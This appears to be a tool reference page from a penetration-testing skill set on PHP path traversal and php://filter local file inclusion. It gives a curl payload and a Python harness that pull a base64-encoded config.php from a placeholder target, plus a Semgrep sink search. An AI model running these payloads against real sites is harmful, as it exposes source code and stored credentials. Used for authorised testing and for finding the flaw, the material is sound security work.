# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`path-traversal-and-lfi-php-wrappers`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS 'https://target.example/view.php?doc=php://filter/read=convert.base64-encode/resource=config.php'` | Confirm the filter wrapper by requesting a base64-encoded disclosure of a known source file | Cross-platform |
| `Semgrep` | `semgrep -e 'file_get_contents($X)' -e 'include($X)' -l php .` | Find file and include sinks whose argument is a variable that could carry a scheme prefix | Cross-platform |
| `Burp Suite Repeater` | `Send plain-path and filter-prefixed requests and diff the responses` | Shows the wrapper transformation against the plain-path baseline on one connection | Cross-platform |

## Minimal Script Shape

A wrapper-detection harness: it fetches a resource by plain path and behind a php://filter base64 chain, then reports whether the filtered response is a base64 transform of the plain read, proving the wrapper is honored.

```python
import base64
import urllib.parse
import urllib.request

BASE = "https://target.example/view.php"
RESOURCE = "config.php"

def fetch(value):
    url = BASE + "?" + urllib.parse.urlencode({"doc": value})
    req = urllib.request.Request(url, headers={"User-Agent": "authorised-assessment"})
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.read()

plain = fetch(RESOURCE)
filtered = fetch("php://filter/read=convert.base64-encode/resource=" + RESOURCE).strip()
try:
    decoded = base64.b64decode(filtered, validate=True)
except Exception:
    decoded = b""
wrapper_live = len(decoded) > 0 and decoded[:16] == plain[:16]
print({"wrapper_honored": wrapper_live,
       "verdict": "filter-wrapper-live" if wrapper_live else "plain-path-only"})
```
